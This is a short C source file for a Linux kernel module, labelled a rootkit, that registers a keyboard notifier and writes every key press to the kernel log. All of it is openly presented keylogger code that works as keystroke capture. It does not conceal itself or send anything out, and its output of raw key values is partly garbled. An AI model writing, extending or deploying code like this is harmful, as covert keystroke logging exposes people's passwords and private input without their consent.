// Linux Rootkit for keylogging

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>

// Callback function
int keyboard_callback(struct notifier_block *nb, unsigned long action, void *data) {
	// Cast the data to keyboard_notifier_param
	struct keyboard_notifier_param *param = data;

	// check if the key is pressed down
	if(param->down) {
		printk(KERN_INFO "Keypressed: %c", param->value);
	}
	return NOTIFY_OK;	
}

// Define keylogger callback funcptr
// This is the parameter passed when registering callback function
static struct notifier_block nblock = {
	// set callback function
	.notifier_call = keyboard_callback
};

// LKM init function
static int __init startup(void) {
	register_keyboard_notifier(&nblock);
	printk(KERN_NOTICE "Keylogger LKM has been loaded\n");
	return 0;
}

// LKM exit function
static void __exit shutdown(void) {
	unregister_keyboard_notifier(&nblock);
	printk(KERN_NOTICE "Keylogger LKM has been removed\n");
}

module_init(startup);
module_exit(shutdown);
MODULE_LICENSE("GPL");
